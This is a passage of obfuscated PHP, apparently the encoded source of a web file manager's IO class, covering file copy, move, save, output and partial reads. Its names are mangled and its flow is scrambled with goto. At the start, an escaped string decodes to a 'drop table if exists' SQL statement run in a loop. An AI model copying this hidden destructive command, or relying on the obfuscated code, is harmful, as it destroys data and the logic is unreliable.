($eÁ°π‡Áêí) { $eÁ°π‡Áêí = strtolower($eÁ°π‡Áêí); } else { continue; } $C€Ï˜Ÿ‚’Ú->execute("\144\x72\157\x70\x20\164\x61\x62\154\145\40\x69\x66\40\x65\170\151\x73\164\163\40\x60{$eÁ°π‡Áêí}\x60"); } } private function taskToCache($A‹Ãº§·Øœ = null) { $fêßÆôçØÉ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$A‹Ãº§·Øœ) { return; } $b»äÂΩ–≠µ = array($fêßÆôçØÉ[1033] => $A‹Ãº§·Øœ->task[$fêßÆôçØÉ[1033]], $fêßÆôçØÉ[1031] => $A‹Ãº§·Øœ->task[$fêßÆôçØÉ[1031]], $fêßÆôçØÉ[1045] => $A‹Ãº§·Øœ->task[$fêßÆôçØÉ[1045]]); if ($b»äÂΩ–≠µ[$fêßÆôçØÉ[1031]] == $b»äÂΩ–≠µ[$fêßÆôçØÉ[1045]]) { $b»äÂΩ–≠µ[$fêßÆôçØÉ[733]] = 1; } Cache::set($fêßÆôçØÉ[1046] . $A‹Ãº§·Øœ->task[$fêßÆôçØÉ[394]], $b»äÂΩ–≠µ); $A‹Ãº§·Øœ->end(); } private function sqlEncode($aÂ†Ò•åÌÓ) { $Eïû¶ï‰…· =& $_SERVER[Öíæ€“”≠éÏË]; $Aà”¨¿©◊ = array(); foreach ($aÂ†Ò•åÌÓ as $Fµôåà∏¬¿) { if (is_array($Fµôåà∏¬¿)) { $Fµôåà∏¬¿ = json_encode_force($Fµôåà∏¬¿); } $Fµôåà∏¬¿ = addslashes($Fµôåà∏¬¿); $Fµôåà∏¬¿ = str_replace(array($Eïû¶ï‰…·[1047], $Eïû¶ï‰…·[229]), array($Eïû¶ï‰…·[1048], $Eïû¶ï‰…·[1049]), $Fµôåà∏¬¿); $Aà”¨¿©◊[] = str_replace($Eïû¶ï‰…·[55], $Eïû¶ï‰…·[1050], $Fµôåà∏¬¿); } return $Eïû¶ï‰…·[55] . implode($Eïû¶ï‰…·[1051], $Aà”¨¿©◊) . $Eïû¶ï‰…·[55]; } private function sqlDecode($dûÜƒÊâîÏ, $dâˆÔ¨ãæ∞) { $F»Ü‹ﬁëë™ =& $_SERVER[Öíæ€“”≠éÏË]; $dûÜƒÊâîÏ = str_replace(array($F»Ü‹ﬁëë™[1048], $F»Ü‹ﬁëë™[1049]), array($F»Ü‹ﬁëë™[1047], $F»Ü‹ﬁëë™[229]), $dûÜƒÊâîÏ); if ($dâˆÔ¨ãæ∞ == $F»Ü‹ﬁëë™[9]) { $dûÜƒÊâîÏ = stripslashes($dûÜƒÊâîÏ); } return $dûÜƒÊâîÏ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c±®ﬂÇà•Ÿ, $eÚã‰≥Çºö) { goto Cì«ãåëÉè; fôæ≥ÛÛÂ“: Hook::trigger($EŒ≤ô‡é´í[1053] . $c±®ﬂÇà•Ÿ . $EŒ≤ô‡é´í[1056], $AèÈ’Ôäâ∏, $CÙÀÙÂ‚∑∂); return $CÙÀÙÂ‚∑∂; goto bª›ˆ˜⁄ è; Cì«ãåëÉè: $EŒ≤ô‡é´í =& $_SERVER[Öíæ€“”≠éÏË]; $AèÈ’Ôäâ∏ = $eÚã‰≥Çºö; $GLOBALS[$EŒ≤ô‡é´í[1052]] = $EŒ≤ô‡é´í[1053] . $c±®ﬂÇà•Ÿ; goto dé´÷ÓË÷≤; dé´÷ÓË÷≤: Hook::trigger($EŒ≤ô‡é´í[1053] . $c±®ﬂÇà•Ÿ . $EŒ≤ô‡é´í[1054], $AèÈ’Ôäâ∏); $c∑áŸáµÿö = self::driverMake($eÚã‰≥Çºö[0]); if (method_exists($c∑áŸáµÿö, $c±®ﬂÇà•Ÿ)) { $CÙÀÙÂ‚∑∂ = @call_user_func_array(array($c∑áŸáµÿö, $c±®ﬂÇà•Ÿ), $eÚã‰≥Çºö); } else { if (method_exists($c∑áŸáµÿö, $EŒ≤ô‡é´í[1055])) { $CÙÀÙÂ‚∑∂ = @call_user_func_array(array($c∑áŸáµÿö, $c±®ﬂÇà•Ÿ), $eÚã‰≥Çºö); } else { if (method_exists(self, $c±®ﬂÇà•Ÿ)) { $CÙÀÙÂ‚∑∂ = @call_user_func_array(array(self, $c±®ﬂÇà•Ÿ), $eÚã‰≥Çºö); } else { $CÙÀÙÂ‚∑∂ = call_user_func_array(array(parent, $c±®ﬂÇà•Ÿ), $eÚã‰≥Çºö); } } } goto fôæ≥ÛÛÂ“; bª›ˆ˜⁄ è: } public static function init($Aô–áÑÇƒù) { return self::driverMake($Aô–áÑÇƒù); } public static function copy($c™¢çåªÈÕ, $CÎÿπò—Ñ‘, $CÆéê≤≠ªÕ = false, $BµôüÍ÷Êƒ = false) { return self::copyMoveStart($c™¢çåªÈÕ, $CÎÿπò—Ñ‘, $CÆéê≤≠ªÕ, $_SERVER[Öíæ€“”≠éÏË][532], $BµôüÍ÷Êƒ); } public static function move($A€»áÎ¢Ñ∞, $Fø»§¶Ï˜‰, $fÌºµπƒπÊ = false, $eåÖóíƒ≤¯ = false) { return self::copyMoveStart($A€»áÎ¢Ñ∞, $Fø»§¶Ï˜‰, $fÌºµπƒπÊ, $_SERVER[Öíæ€“”≠éÏË][534], $eåÖóíƒ≤¯); } private static function copyMoveStart($cèÈç⁄ı√Ô, $b±ù√À„Ÿñ, $bå◊ÿ≠Êø∫, $E›‹Á˜±∫, $bòÌıîˆ¯ë) { $dñéÎüòãÆ =& $_SERVER[Öíæ€“”≠éÏË]; $eÖ±π⁄›ƒ† = array($cèÈç⁄ı√Ô, $b±ù√À„Ÿñ, $bå◊ÿ≠Êø∫, $bòÌıîˆ¯ë); Hook::trigger($dñéÎüòãÆ[1053] . $E›‹Á˜±∫ . $dñéÎüòãÆ[1054], $eÖ±π⁄›ƒ†); $D–∞á±ÓíÈ = self::copyMove($cèÈç⁄ı√Ô, $b±ù√À„Ÿñ, $bå◊ÿ≠Êø∫, $E›‹Á˜±∫, $bòÌıîˆ¯ë); Hook::trigger($dñéÎüòãÆ[1053] . $E›‹Á˜±∫ . $dñéÎüòãÆ[1056], $eÖ±π⁄›ƒ†, $D–∞á±ÓíÈ); return $D–∞á±ÓíÈ; } public static function saveFile($f±∑—Ì–øﬁ, $D√Ú–âÖ‚Ç, $eÇ≤öÑÖàÚ = true) { goto Dç‹œÔÀ°; E◊´¶àŒÈı: return $aÕê§ñåƒÿ; goto eƒî£ΩÕéö; aΩŒÌ™à—ü: $b∂áç´œ‚œ = self::driverMake($D√Ú–âÖ‚Ç); $d∆„˘ˆπ‚ﬂ = !1; if ($b∂áç´œ‚œ->pathParse[$eÂú¢—˘Ωá[1057]]) { $d∆„˘ˆπ‚ﬂ = $b∂áç´œ‚œ; $b∂áç´œ‚œ = self::driverMake($b∂áç´œ‚œ->pathParse[$eÂú¢—˘Ωá[1057]]); } goto fú÷ô≤∫ÿ»; D˜äƒ÷›Í•: if (!$eÇ≤öÑÖàÚ && self::driverIsSame($C—∑ÜÊÀπæ, $b∂áç´œ‚œ)) { $B≈û„¯‰ó∆ = !1; } $aÕê§ñåƒÿ = self::copyFile($C—∑ÜÊÀπæ, $f±∑—Ì–øﬁ, $b∂áç´œ‚œ, $aêªòÜ∂ê´, $AóÛ⁄å©¨ú[$eÂú¢—˘Ωá[28]], $B≈û„¯‰ó∆); if ($d∆„˘ˆπ‚ﬂ) { $aÕê§ñåƒÿ = $d∆„˘ˆπ‚ﬂ->getPathOuter($aÕê§ñåƒÿ); } goto E◊´¶àŒÈı; fú÷ô≤∫ÿ»: if ($C—∑ÜÊÀπæ->pathParse[$eÂú¢—˘Ωá[1057]]) { $C—∑ÜÊÀπæ = self::driverMake($C—∑ÜÊÀπæ->pathParse[$eÂú¢—˘Ωá[1057]]); } $aêªòÜ∂ê´ = $b∂áç´œ‚œ->pathFather($D√Ú–âÖ‚Ç); $B≈û„¯‰ó∆ = !0; goto D˜äƒ÷›Í•; Dç‹œÔÀ°: $eÂú¢—˘Ωá =& $_SERVER[Öíæ€“”≠éÏË]; $AóÛ⁄å©¨ú = self::info($D√Ú–âÖ‚Ç); $C—∑ÜÊÀπæ = self::driverMake($f±∑—Ì–øﬁ); goto aΩŒÌ™à—ü; eƒî£ΩÕéö: } private static function copyMove($FïÃ˜·“Ïã, $eÓ”Üºô√§, $bÎÀ†˘∑©», $Cêƒ°≤ÌÉ§, $bå∏€áüµÕ = false) { goto eºÊ¶¢∫‡π; Dã√äîÑ†ø: $EØãŸ“ˆˆç = !1; if ($eàïôÆπ◊ê->pathParse[$b«ßÑÉáÙ‰[1057]]) { $EØãŸ“ˆˆç = $eàïôÆπ◊ê; $eàïôÆπ◊ê = self::driverMake($eàïôÆπ◊ê->pathParse[$b«ßÑÉáÙ‰[1057]]); } if ($a¿•âî¡ú®->pathParse[$b«ßÑÉáÙ‰[1057]]) { $a¿•âî¡ú® = self::driverMake($a¿•âî¡ú®->pathParse[$b«ßÑÉáÙ‰[1057]]); } goto dÃáí‘ﬂ±í; dÃáí‘ﬂ±í: self::check($a¿•âî¡ú®, $FïÃ˜·“Ïã, $eàïôÆπ◊ê, $eÓ”Üºô√§); Hook::trigger($b«ßÑÉáÙ‰[73], $a¿•âî¡ú®, $FïÃ˜·“Ïã, $eàïôÆπ◊ê, $eÓ”Üºô√§); $f¥òãøãÓõ = self::driverIsSame($a¿•âî¡ú®, $eàïôÆπ◊ê); goto Cñ≈ëü±’â; eºÊ¶¢∫‡π: $b«ßÑÉáÙ‰ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$FïÃ˜·“Ïã || $FïÃ˜·“Ïã == $b«ßÑÉáÙ‰[8] || !$eÓ”Üºô√§) { return !1; } ignore_timeout(); goto eìªÀ–◊†í; FøÑ≈Ñıÿ¿: if ($C’ŒÊ∫œº∆ && $CÏ°Èﬂπó™) { $a¿•âî¡ú®->remove($FïÃ˜·“Ïã); } if ($EØãŸ“ˆˆç) { $C’ŒÊ∫œº∆ = $EØãŸ“ˆˆç->getPathOuter($C’ŒÊ∫œº∆); } return $C’ŒÊ∫œº∆; goto a…ä∫§Œ€“; eìªÀ–◊†í: $a¿•âî¡ú® = self::driverMake($FïÃ˜·“Ïã); $eàïôÆπ◊ê = self::driverMake($eÓ”Üºô√§); $CÏ°Èﬂπó™ = $Cêƒ°≤ÌÉ§ == $b«ßÑÉáÙ‰[534]; goto Dã√äîÑ†ø; Cñ≈ëü±’â: if ($f¥òãøãÓõ) { if ($Cêƒ°≤ÌÉ§ == $b«ßÑÉáÙ‰[534] && !method_exists($eàïôÆπ◊ê, $b«ßÑÉáÙ‰[1058]) && trim($eÓ”Üºô√§, $b«ßÑÉáÙ‰[8]) == trim($eàïôÆπ◊ê->pathFather($FïÃ˜·“Ïã), $b«ßÑÉáÙ‰[8])) { if ($a¿•âî¡ú®->pathThis($FïÃ˜·“Ïã) != $bå∏€áüµÕ && !$a¿•âî¡ú®->isTypeObject()) { return $a¿•âî¡ú®->rename($FïÃ˜·“Ïã, $bå∏€áüµÕ); } return $eàïôÆπ◊ê->getPathOuter($FïÃ˜·“Ïã); } if (method_exists($eàïôÆπ◊ê, $Cêƒ°≤ÌÉ§)) { return $eàïôÆπ◊ê->{$Cêƒ°≤ÌÉ§}($FïÃ˜·“Ïã, $eÓ”Üºô√§, $bÎÀ†˘∑©»); } } $eùø◊∆⁄ê’ = $a¿•âî¡ú®->isFile($FïÃ˜·“Ïã); if (!$eùø◊∆⁄ê’ && $eàïôÆπ◊ê->getType() == $b«ßÑÉáÙ‰[731] && $a¿•âî¡ú®->getType() == $b«ßÑÉáÙ‰[106]) { $C’ŒÊ∫œº∆ = $eàïôÆπ◊ê->copyFolderFromIO($a¿•âî¡ú®, $FïÃ˜·“Ïã, $eÓ”Üºô√§, $bÎÀ†˘∑©», $CÏ°Èﬂπó™, $bå∏€áüµÕ); } else { $C’ŒÊ∫œº∆ = self::copyPath($a¿•âî¡ú®, $FïÃ˜·“Ïã, $eàïôÆπ◊ê, $eÓ”Üºô√§, $bÎÀ†˘∑©», $CÏ°Èﬂπó™, $eùø◊∆⁄ê’, $bå∏€áüµÕ); } goto FøÑ≈Ñıÿ¿; a…ä∫§Œ€“: } private static function check($A–Ê ó €›, $b∞π·°Â‹, $DÌóî≈Ûòö, &$D“ÛÒº∫Èë) { $d—’È¨º—… =& $_SERVER[Öíæ€“”≠éÏË]; if (self::driverIsSame($A–Ê ó €›, $DÌóî≈Ûòö) && $A–Ê ó €›->isFolder($b∞π·°Â‹) && $A–Ê ó €›->isParentOf($b∞π·°Â‹, $D“ÛÒº∫Èë)) { show_json(LNG($d—’È¨º—…[1059]), !1); } if (!$A–Ê ó €›->exist($b∞π·°Â‹)) { show_json(LNG($d—’È¨º—…[105]), !1); } } private static function copyPath($b’∞±ÎŒÉô, $dÚìåõáçÑ, $E‘ãÖßÙÎË, $cØ˜ì”Çœà, $dÀÜåÔÂ≥é, $f˜êßÈùÀÛ, $a◊ß¬ƒ·û, $FÑÑæ≠˘ÜÆ = false) { goto e™¬éÜø„; C∞æàÀ®ôö: if ($a◊ß¬ƒ·û) { return self::copyFile($b’∞±ÎŒÉô, $dÚìåõáçÑ, $E‘ãÖßÙÎË, $cØ˜ì”Çœà, $eÖëßá‡Ω≤, $f˜êßÈùÀÛ); } if ($dÀÜåÔÂ≥é == REPEAT_RENAME_FOLDER) { $dÀÜåÔÂ≥é = !1; } $dçïò¯áá’ = rtrim($cØ˜ì”Çœà, $FÇıŸ´·˜ù[8]) . $FÇıŸ´·˜ù[8] . $eÖëßá‡Ω≤; goto FÕàˆô∆ñ‰; FÕàˆô∆ñ‰: $aÁÜÑ≤Ü†‘ = $E‘ãÖßÙÎË->mkdir($E‘ãÖßÙÎË->getPath($dçïò¯áá’)); $cØ˜ì”Çœà = $E‘ãÖßÙÎË->getPathInner($aÁÜÑ≤Ü†‘); $c¬Ì≠¨î“π = $b’∞±ÎŒÉô->listPath($dÚìåõáçÑ, !0); goto E•àÙ´°ó≥; E•àÙ´°ó≥: $c¬Ì≠¨î“π = is_array($c¬Ì≠¨î“π) ? $c¬Ì≠¨î“π : array($FÇıŸ´·˜ù[74] => array(), $FÇıŸ´·˜ù[75] => array()); $eãÑÑìºëˆ = array_merge($c¬Ì≠¨î“π[$FÇıŸ´·˜ù[74]], $c¬Ì≠¨î“π[$FÇıŸ´·˜ù[75]]); foreach ($eãÑÑìºëˆ as $C¶ç…˜ÉπÒ) { $dÁû§ç∞Æ≤ = $C¶ç…˜ÉπÒ[$FÇıŸ´·˜ù[29]] == $FÇıŸ´·˜ù[193]; $dÚìåõáçÑ = $b’∞±ÎŒÉô->getPathInner($C¶ç…˜ÉπÒ[$FÇıŸ´·˜ù[76]]); $A¡òöÉëª« = self::copyPath($b’∞±ÎŒÉô, $dÚìåõáçÑ, $E‘ãÖßÙÎË, $cØ˜ì”Çœà, $dÀÜåÔÂ≥é, $f˜êßÈùÀÛ, $dÁû§ç∞Æ≤); if (!$A¡òöÉëª«) { IO::errorTips($FÇıŸ´·˜ù[1060] . $dÚìåõáçÑ . $FÇıŸ´·˜ù[67] . $cØ˜ì”Çœà); } } goto Aù•÷Î›∑…; Aù•÷Î›∑…: self::copyMoveKeepInfo($b’∞±ÎŒÉô, $dÚìåõáçÑ, $aÁÜÑ≤Ü†‘); return $aÁÜÑ≤Ü†‘; goto B›µÃ£˘¨á; e™¬éÜø„: $FÇıŸ´·˜ù =& $_SERVER[Öíæ€“”≠éÏË]; $eÖëßá‡Ω≤ = empty($FÑÑæ≠˘ÜÆ) && $FÑÑæ≠˘ÜÆ !== $FÇıŸ´·˜ù[191] ? $b’∞±ÎŒÉô->pathThis($dÚìåõáçÑ) : $FÑÑæ≠˘ÜÆ; if ($dÀÜåÔÂ≥é) { $b›ÉáÕÖÈù = $E‘ãÖßÙÎË->fileNameExist($cØ˜ì”Çœà, $eÖëßá‡Ω≤); $eÖëßá‡Ω≤ = $E‘ãÖßÙÎË->fileNameAuto($cØ˜ì”Çœà, $eÖëßá‡Ω≤, $dÀÜåÔÂ≥é, !$a◊ß¬ƒ·û); $dÀÜåÔÂ≥é = $b›ÉáÕÖÈù ? $dÀÜåÔÂ≥é : !1; } goto C∞æàÀ®ôö; B›µÃ£˘¨á: } private static function copyFile($f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Dò°´À›ñÇ, $bπëÕ≈ﬁüã, $aÜáØòå¬Ô, $DàäÊà˘çŸ) { goto bÙ·öÔä”ª; bÙ·öÔä”ª: $bãÈ’ﬁ‡ºû =& $_SERVER[Öíæ€“”≠éÏË]; $bπëÕ≈ﬁüã = $Dò°´À›ñÇ->getPath(rtrim($bπëÕ≈ﬁüã, $bãÈ’ﬁ‡ºû[8]) . $bãÈ’ﬁ‡ºû[8] . $aÜáØòå¬Ô); $Eòã¥â‰˘à = $bãÈ’ﬁ‡ºû[1061] . time() . rand_string(5); goto DÕËÎëÉÏœ; D‹çœøå›å: $bà·Ù™§î• = $f¬òíõﬁÌì->download($eÈ®‰…◊ﬁü, $bà·Ù™§î•); $bà·Ù™§î• = $f¬òíõﬁÌì->iconvApp($bà·Ù™§î•); $Få∏÷ùÆ´ = $Dò°´À›ñÇ->upload($bπëÕ≈ﬁüã, $bà·Ù™§î•, $DàäÊà˘çŸ); goto fô©·ã–πÁ; fô©·ã–πÁ: self::remove($B•⁄ß¿å—Ç); Hook::trigger($bãÈ’ﬁ‡ºû[1063], $f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Dò°´À›ñÇ, $bπëÕ≈ﬁüã, $aÜáØòå¬Ô, $Få∏÷ùÆ´); self::copyMoveKeepInfo($f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Få∏÷ùÆ´); goto d‘òµÛŸâ’; d‘òµÛŸâ’: return $Få∏÷ùÆ´; goto cô âúëûÎ; DÕËÎëÉÏœ: Hook::trigger($bãÈ’ﬁ‡ºû[1062], $f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Dò°´À›ñÇ, $bπëÕ≈ﬁüã, $aÜáØòå¬Ô, $Eòã¥â‰˘à); if (self::driverIsSame($f¬òíõﬁÌì, $Dò°´À›ñÇ)) { if ($DàäÊà˘çŸ) { $Få∏÷ùÆ´ = $Dò°´À›ñÇ->moveFile($eÈ®‰…◊ﬁü, $bπëÕ≈ﬁüã); } else { $Få∏÷ùÆ´ = $Dò°´À›ñÇ->copyFile($eÈ®‰…◊ﬁü, $bπëÕ≈ﬁüã); } Hook::trigger($bãÈ’ﬁ‡ºû[1063], $f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Dò°´À›ñÇ, $bπëÕ≈ﬁüã, $aÜáØòå¬Ô, $Få∏÷ùÆ´); self::copyMoveKeepInfo($f¬òíõﬁÌì, $eÈ®‰…◊ﬁü, $Få∏÷ùÆ´); return $Få∏÷ùÆ´; } $a“…®˘∏Ç… = TEMP_FILES; goto bÌÏ•≥ûà´; bÌÏ•≥ûà´: if ($GLOBALS[$bãÈ’ﬁ‡ºû[6]][$bãÈ’ﬁ‡ºû[88]][$bãÈ’ﬁ‡ºû[773]]) { $a“…®˘∏Ç… = $GLOBALS[$bãÈ’ﬁ‡ºû[6]][$bãÈ’ﬁ‡ºû[88]][$bãÈ’ﬁ‡ºû[773]]; } $DàäÊà˘çŸ = !0; $Cà¢∆ΩÊ‘è = $a“…®˘∏Ç…; goto dÒ‹®ïﬂê∆; dÒ‹®ïﬂê∆: mk_dir($Cà¢∆ΩÊ‘è); $bà·Ù™§î• = $Cà¢∆ΩÊ‘è . $Eòã¥â‰˘à; $B•⁄ß¿å—Ç = $bà·Ù™§î•; goto D‹çœøå›å; cô âúëûÎ: } private static function copyMoveKeepInfo($f†Ò·ˆ√á„, $Dª√ãØﬂıé, $d¨îê‹ü™·) { if (!$d¨îê‹ü™·) { return; } $cáΩ‚ª∂é = $f†Ò·ˆ√á„->info($Dª√ãØﬂıé); if (!is_array($cáΩ‚ª∂é)) { return; } IO::setModifyTime($d¨îê‹ü™·, $cáΩ‚ª∂é[$_SERVER[Öíæ€“”≠éÏË][84]]); } public static function pathFather($A†∫√ã≠»ÿ) { $C„∂ºŸã∫ÿ = IO::init($A†∫√ã≠»ÿ); $e§õ í§É“ = $C„∂ºŸã∫ÿ->pathFather($C„∂ºŸã∫ÿ->path); return $C„∂ºŸã∫ÿ->getPathOuter($e§õ í§É“); } public static function fileOut($E«Ç±ßÂ‘ñ, $f≈ù≈¡‘¥ı = false, $c»ùÁöªûƒ = false, $eÂàÜÏìö  = '') { $CöÕ’óÊèã = self::driverMake($E«Ç±ßÂ‘ñ); if ($CöÕ’óÊèã->isFileOutServer()) { return $CöÕ’óÊèã->fileOutServer($E«Ç±ßÂ‘ñ, $f≈ù≈¡‘¥ı, $c»ùÁöªûƒ, $eÂàÜÏìö ); } return $CöÕ’óÊèã->fileOut($E«Ç±ßÂ‘ñ, $f≈ù≈¡‘¥ı, $c»ùÁöªûƒ, $eÂàÜÏìö ); } public static function fileOutImage($c“ö™∫Ï…Õ, $d≈ê·≈ôˆØ = 250) { $D¿˜Øﬁò– = array(250, 600, 1200, 3000, 5000); for ($fà—îö¿¿ª = 0; $fà—îö¿¿ª < count($D¿˜Øﬁò–); $fà—îö¿¿ª++) { if ($fà—îö¿¿ª == 0 && $d≈ê·≈ôˆØ <= $D¿˜Øﬁò–[$fà—îö¿¿ª]) { $d≈ê·≈ôˆØ = $D¿˜Øﬁò–[$fà—îö¿¿ª]; break; } else { if ($d≈ê·≈ôˆØ > $D¿˜Øﬁò–[$fà—îö¿¿ª - 1] && $d≈ê·≈ôˆØ <= $D¿˜Øﬁò–[$fà—îö¿¿ª]) { $d≈ê·≈ôˆØ = $D¿˜Øﬁò–[$fà—îö¿¿ª]; break; } else { if ($fà—îö¿¿ª == count($D¿˜Øﬁò–) - 1 && $d≈ê·≈ôˆØ > $D¿˜Øﬁò–[$fà—îö¿¿ª]) { $d≈ê·≈ôˆØ = $D¿˜Øﬁò–[$fà—îö¿¿ª]; break; } } } } $bÎÂéóñ≈´ = self::driverMake($c“ö™∫Ï…Õ); if ($bÎÂéóñ≈´->isFileOutServer()) { return $bÎÂéóñ≈´->fileOutImageServer($c“ö™∫Ï…Õ, $d≈ê·≈ôˆØ); } return $bÎÂéóñ≈´->fileOutImage($c“ö™∫Ï…Õ, $d≈ê·≈ôˆØ); } private static function driverIsSame($f¬∫¯Ó±⁄¯, $cÿÀ‘¢–í¡) { goto eôÂÕÈ®‹—; bæß∆«–§è: if ($f¬∫¯Ó±⁄¯->pathDriver == $cÿÀ‘¢–í¡->pathDriver) { return !0; } return !1; goto b¬œ„ë¨§Ù; A´í¯õÜ≈å: if ($fòáÇ≥Ù≤€ != $dù¬•‡ˆ“Û) { return !1; } if ($fòáÇ≥Ù≤€ == $aé∂˘™É‚Ü[731]) { return !0; } if ($fòáÇ≥Ù≤€ == $aé∂˘™É‚Ü[106]) { return !0; } goto bæß∆«–§è; eôÂÕÈ®‹—: $aé∂˘™É‚Ü =& $_SERVER[Öíæ€“”≠éÏË]; $fòáÇ≥Ù≤€ = $f¬∫¯Ó±⁄¯->getType(); $dù¬•‡ˆ“Û = $cÿÀ‘¢–í¡->getType(); goto A´í¯õÜ≈å; b¬œ„ë¨§Ù: } public static function copyUpdate($eêºâﬂ¬ı», $AèºÆæŒﬁ‚) { goto A”ﬁÜÔ·ÓÇ; A”ﬁÜÔ·ÓÇ: $f‘ŸÁ¯ÿﬁˆ =& $_SERVER[Öíæ€“”≠éÏË]; if (!IO::exist($eêºâﬂ¬ı»)) { return !1; } if (!IO::exist($AèºÆæŒﬁ‚)) { IO::mkdir($AèºÆæŒﬁ‚); } goto DŒÊΩ»ÁàÈ; búíÃ„∆ÆÖ: $a∏—⁄‚êõÌ = array(); foreach ($fßóÑ¨Ç€· as $b¯†ú´≥·õ => $eØàÙ√Ê°¶) { if (isset($a∏«å°ìı◊[$b¯†ú´≥·õ])) { if ($eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[77]] == 1) { continue; } if ($a∏«å°ìı◊[$b¯†ú´≥·õ][$f‘ŸÁ¯ÿﬁˆ[78]] == $eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[78]]) { continue; } } if ($eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[77]] == 1) { $a∏—⁄‚êõÌ[] = $AèºÆæŒﬁ‚ . $f‘ŸÁ¯ÿﬁˆ[8] . $b¯†ú´≥·õ; continue; } $døÚñÀ∫πß = strstr(trim($b¯†ú´≥·õ, $f‘ŸÁ¯ÿﬁˆ[8]), $f‘ŸÁ¯ÿﬁˆ[8]) ? get_path_father($b¯†ú´≥·õ) : $f‘ŸÁ¯ÿﬁˆ[33]; $F·£Œ°Ÿâ≤[] = array($f‘ŸÁ¯ÿﬁˆ[1064] => $eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[76]], $f‘ŸÁ¯ÿﬁˆ[1065] => rtrim($AèºÆæŒﬁ‚, $f‘ŸÁ¯ÿﬁˆ[8]) . $f‘ŸÁ¯ÿﬁˆ[8] . $døÚñÀ∫πß, $f‘ŸÁ¯ÿﬁˆ[1066] => $eØàÙ√Ê°¶); } $dà˜äŒˆ“à = array($f‘ŸÁ¯ÿﬁˆ[193] => $F·£Œ°Ÿâ≤, $f‘ŸÁ¯ÿﬁˆ[77] => $a∏—⁄‚êõÌ); goto eÃ•±‡„È´; eÃ•±‡„È´: Hook::trigger($f‘ŸÁ¯ÿﬁˆ[1067], $eêºâﬂ¬ı», $AèºÆæŒﬁ‚, $dà˜äŒˆ“à); foreach ($a∏—⁄‚êõÌ as $eØàÙ√Ê°¶) { IO::mkdir($eØàÙ√Ê°¶); } foreach ($F·£Œ°Ÿâ≤ as $eØàÙ√Ê°¶) { IO::copy($eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[1064]], $eØàÙ√Ê°¶[$f‘ŸÁ¯ÿﬁˆ[1065]], REPEAT_REPLACE); } goto dŒÌ–É¬ä´; DŒÊΩ»ÁàÈ: $fßóÑ¨Ç€· = self::_listAll($eêºâﬂ¬ı»); $a∏«å°ìı◊ = self::_listAll($AèºÆæŒﬁ‚); $F·£Œ°Ÿâ≤ = array(); goto búíÃ„∆ÆÖ; dŒÌ–É¬ä´: } private static function _listAll($aÌÎ„˘∏à°) { $fÇ”∂ﬂíáë =& $_SERVER[Öíæ€“”≠éÏË]; $aÌÎ„˘∏à° = KodIO::clear($aÌÎ„˘∏à°); $F¥√«≈À¡— = IO::listAll($aÌÎ„˘∏à°); foreach ($F¥√«≈À¡— as &$Bƒ¥’”∫Î÷) { $Bˆ»†·⁄ò˜ = substr($Bƒ¥’”∫Î÷[$fÇ”∂ﬂíáë[76]], strlen($aÌÎ„˘∏à°)); $Bƒ¥’”∫Î÷[$fÇ”∂ﬂíáë[1068]] = trim($Bˆ»†·⁄ò˜, $fÇ”∂ﬂíáë[8]); } unset($Bƒ¥’”∫Î÷); return array_to_keyvalue($F¥√«≈À¡—, $fÇ”∂ﬂíáë[1068]); } public static function fileSubstr($C∏≠ëÙËßõ, $AˆáÌôü≥¬, $AãèÂú⁄Í = false) { goto fä´«±ﬂ†ó; fÆÔæµ›±¬: if ($AãèÂú⁄Í <= 0) { return $aÜﬁƒ∆ûè˘[33]; } if ($AˆáÌôü≥¬ < 0 || $AˆáÌôü≥¬ >= $AÚ´ñ«Î·ê || $AãèÂú⁄Í > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\145\x52\x65\x61\144\40\x65\x72\162\157\162\x21\40\163\x74\141\162\164\x3d{$AˆáÌôü≥¬}\x3b\x6c\x65\156\147\164\x68\75{$AãèÂú⁄Í}\73\x20\163\x69\x7a\x65\75{$AÚ´ñ«Î·ê}\x3b"); } $C◊·úŸÃ©¨ = $d·é¯ÊóÉ˜->fileSubstr($C∏≠ëÙËßõ, $AˆáÌôü≥¬, $AãèÂú⁄Í); goto B›…ıØı∆∆; cËÁ¡¨’÷†: if ($AãèÂú⁄Í === !1) { $AãèÂú⁄Í = $AÚ´ñ«Î·ê - $AˆáÌôü≥¬; } if ($AˆáÌôü≥¬ + $AãèÂú⁄Í > $AÚ´ñ«Î·ê) { $AãèÂú⁄Í = $AÚ´ñ«Î·ê - $AˆáÌôü≥¬; } if (!$AÚ´ñ«Î·ê && $d·é¯ÊóÉ˜->getType() == $aÜﬁƒ∆ûè˘[106] && !$d·é¯ÊóÉ˜->exist($C∏≠ëÙËßõ)) { throw new Exception($aÜﬁƒ∆ûè˘[1069] . LNG($aÜﬁƒ∆ûè˘[1070]) . $aÜﬁƒ∆ûè˘[935] . get_path_this($C∏≠ëÙËßõ) . $aÜﬁƒ∆ûè˘[33]); } goto fÆÔæµ›±¬; B›…ıØı∆∆: if (!$C◊·úŸÃ©¨ && $AãèÂú⁄Í && isset($GLOBALS[$aÜﬁƒ∆ûè˘[1071]])) { throw new Exception($GLOBALS[$aÜﬁƒ∆ûè˘[1071]][$aÜﬁƒ∆ûè˘[1072]]); } return $C◊·úŸÃ©¨; goto bÿç±¡äÆ§; fä´«±ﬂ†ó: $aÜﬁƒ∆ûè˘ =& $_SERVER[Öíæ€“”≠éÏË]; $d·é¯ÊóÉ˜ = self::driverMake($C∏≠ëÙËßõ); $AÚ´ñ«Î·ê = $d·é¯ÊóÉ˜->size($C∏≠ëÙËßõ); goto aù∏£áˆ∞∏; aù∏£áˆ∞∏: $bÏÇãé›Øè = $AˆáÌôü≥¬; $EïÀÇÕﬂ£¬ = $AãèÂú⁄Í; if ($AˆáÌôü≥¬ < 0) { $AˆáÌôü≥¬ = 